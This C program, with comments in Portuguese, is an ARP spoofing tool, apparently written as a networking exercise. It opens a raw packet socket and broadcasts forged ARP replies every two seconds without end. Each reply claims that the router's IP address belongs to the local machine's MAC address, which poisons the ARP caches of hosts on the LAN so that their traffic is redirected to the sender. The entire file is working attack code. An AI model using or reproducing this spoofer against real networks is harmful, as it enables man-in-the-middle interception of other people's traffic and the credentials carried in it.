
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>

#define MAC_ADDR_LEN 6
#define BUFFER_SIZE 1600
#define MAX_DATA_SIZE 1500

int main(int argc, char *argv[])
{
	int fd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	struct sockaddr_ll socket_address;
	char ifname[IFNAMSIZ];
	int frame_len = 0;
	char buffer[BUFFER_SIZE];
	char data[MAX_DATA_SIZE];
	char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
	short int ethertype = htons(0x0806);

	char HTYPE[] = {0x00, 0x01};  // HARDWARE TYPE. ETHERNET = 1
	char PTYPE[] = {0x08, 0x00};  // PROTOCOL TYPE. IPv4 = 0x800
	char HLEN[]  = {0x06};        // HARDWARE SIZE = 6
	char PLEN[]  = {0x04};        // PROTOCOL SIZE = 4
	char OPER[]  = {0x00, 0x02};  // OPERATION 1 TO REQUEST. 2 TO REPLY
	unsigned char TPA[4];
	unsigned char SPA[4];

	if (argc != 4) {
		printf("param 1: ip alvo\n param 2: ip roteador");
		return 1;
	}

	// ip target
	unsigned char firstOctetHex, secondOctetHex, thirdOctetHex, fourthOctetHex; 
	short int firstOctet, secondOctet, thirdOctet, fourthOctet;

	sscanf(argv[2], "%d.%d.%d.%d.", &firstOctet, &secondOctet, &thirdOctet, &fourthOctet);

	firstOctetHex  = (char) firstOctet;
	secondOctetHex = (char) secondOctet;
	thirdOctetHex  = (char) thirdOctet;
	fourthOctetHex = (char) fourthOctet;
	
	TPA[0] = firstOctetHex;
	TPA[1] = secondOctetHex;
	TPA[2] = thirdOctetHex;
	TPA[3] = fourthOctetHex;

	printf("0x%0x\n", TPA[0]);
	printf("0x%0x\n", TPA[1]);
	printf("0x%0x\n", TPA[2]);
	printf("0x%0x\n", TPA[3]);

	
	// ip router
	sscanf(argv[3], "%d.%d.%d.%d.", &firstOctet, &secondOctet, &thirdOctet, &fourthOctet);

	firstOctetHex  = (char) firstOctet;
	secondOctetHex = (char) secondOctet;
	thirdOctetHex  = (char) thirdOctet;
	fourthOctetHex = (char) fourthOctet;
	
	SPA[0] = firstOctetHex;
	SPA[1] = secondOctetHex;
	SPA[2] = thirdOctetHex;
	SPA[3] = fourthOctetHex;

	printf("0x%0x\n", SPA[0]);
	printf("0x%0x\n", SPA[1]);
	printf("0x%0x\n", SPA[2]);
	printf("0x%0x\n", SPA[3]);

	strcpy(ifname, argv[1]);

	/* Cria um descritor de socket do tipo RAW */
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
		perror("socket");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}

	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}	

	// meu mac
	unsigned char SHA[] = { if_mac.ifr_hwaddr.sa_data[0],
							if_mac.ifr_hwaddr.sa_data[1],
							if_mac.ifr_hwaddr.sa_data[2],
							if_mac.ifr_hwaddr.sa_data[3],
							if_mac.ifr_hwaddr.sa_data[4],
							if_mac.ifr_hwaddr.sa_data[5] };
	
	// meu mac
	unsigned char THA[] = { if_mac.ifr_hwaddr.sa_data[0],
							if_mac.ifr_hwaddr.sa_data[1],
							if_mac.ifr_hwaddr.sa_data[2],
							if_mac.ifr_hwaddr.sa_data[3],
							if_mac.ifr_hwaddr.sa_data[4],
							if_mac.ifr_hwaddr.sa_data[5] };

	/* Indice da interface de rede */
	socket_address.sll_ifindex = if_idx.ifr_ifindex;

	/* Tamanho do endereco (ETH_ALEN = 6) */
	socket_address.sll_halen = ETH_ALEN;

	/* Endereco MAC de destino */
	memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);

	/* Preenche o buffer com 0s */
	memset(buffer, 0, BUFFER_SIZE);

	/* Monta o cabecalho Ethernet */

	/* Preenche o campo de endereco MAC de destino */
	memcpy(buffer, dest_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo EtherType */
	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);


	/* ARP */
	memcpy(buffer + frame_len, HTYPE, sizeof(HTYPE));
    frame_len += sizeof(HTYPE);

    memcpy(buffer + frame_len, PTYPE, sizeof(PTYPE));
    frame_len += sizeof(PTYPE);

    memcpy(buffer + frame_len, HLEN, sizeof(HLEN));
    frame_len += sizeof(HLEN);

    memcpy(buffer + frame_len, PLEN, sizeof(PLEN));
    frame_len += sizeof(PLEN);

    memcpy(buffer + frame_len, OPER, sizeof(OPER));
    frame_len += sizeof(OPER);

    memcpy(buffer + frame_len, SHA, sizeof(SHA));
    frame_len += sizeof(SHA);

    memcpy(buffer + frame_len, SPA, sizeof(SPA));
    frame_len += sizeof(SPA);

    memcpy(buffer + frame_len, THA, sizeof(THA));
    frame_len += sizeof(THA);

    memcpy(buffer + frame_len, TPA, sizeof(TPA));
    frame_len += sizeof(TPA);

	while (1) {

		/* Envia pacote */
		if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
			perror("send");
			close(fd);
			exit(1);
		}

		sleep(2);

		printf("Arp reply enviado.\n");
	}

	close(fd);
	return 0;
}
